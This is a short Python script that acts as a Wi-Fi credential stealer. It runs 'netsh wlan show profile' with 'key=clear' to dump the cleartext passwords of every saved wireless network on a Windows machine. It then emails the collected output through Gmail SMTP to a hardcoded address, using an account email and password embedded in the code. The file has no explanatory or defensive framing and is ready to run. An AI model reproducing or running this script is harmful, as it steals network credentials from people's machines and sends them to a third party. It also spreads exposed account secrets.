import re
import smtplib,subprocess

def send_mail(email,password,message):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.close()

command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
networks = networks.decode(encoding='UTF-8')
networks_names = re.findall("(?:Profile\s*:\s)(.*)",networks)

result = ""
result = str.encode(result)

for network_name in networks_names:
    command = "netsh wlan show profile \"" + network_name + "\" key=clear"
    current_result = subprocess.check_output(command, shell=True)

    result = result + current_result

send_mail("lequangvinh162@gmail.com", "flwzlsuwtzulpivt", result)